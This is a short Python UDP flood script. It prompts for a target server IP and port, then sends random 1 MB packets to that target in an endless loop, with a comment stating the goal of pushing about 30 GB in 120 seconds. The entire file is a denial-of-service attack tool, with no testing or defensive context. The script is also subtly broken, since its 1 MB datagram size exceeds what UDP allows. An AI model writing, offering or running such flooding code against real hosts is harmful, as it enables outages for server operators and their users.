import socket
import random
import time

# User input for target IP and UDP port
target_ip = input("Enter the target server IP: ")
target_port = int(input("Enter the target server UDP port: "))

packet_size = 1024 * 1024  # 1MB packet
packets_per_second = 256  # Packets per second (to send 30GB in 120 seconds)

def flood_traffic():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while True:
        packet = random._urandom(packet_size)
        sock.sendto(packet, (target_ip, target_port))
        time.sleep(1 / packets_per_second)  # Sending at the required rate

if __name__ == "__main__":
    flood_traffic()
